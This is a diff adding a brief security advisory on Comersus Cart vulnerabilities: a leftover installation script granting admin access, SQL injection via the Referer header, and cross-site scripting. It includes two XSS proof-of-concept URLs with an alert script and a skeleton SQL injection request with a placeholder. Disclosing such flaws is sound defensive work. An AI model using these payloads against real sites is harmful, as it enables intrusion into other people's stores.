@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/12362/info
+
+Comersus Cart is reportedly affected by multiple vulnerabilities. There is a possiblity of gaining administrator access due to a failure of the application to remove an installation script after install. There is the possiblity of SQL injection by passing a malicious HTTP referer header. There are also some possible cross-site scripting issues.
+
+The vendor has addressed these issues in Comersus Cart version 6.0.2; earlier version are reportedly vulnerable. 
+
+http://www.example.com/comersus/backofficelite/comersus_supportError.asp?error=<script>alert('hi%20mum');</script>
+http://www.example.com/comersus/backofficelite/comersus_backofficelite_supportError.asp?error=<script>alert('hi%20mum');</script>
+
+The following proof of concept is available for the SQL injection issue:
+GET /comersus/store/default.asp HTTP/1.1
+Referer: <SQLCODE HERE> 
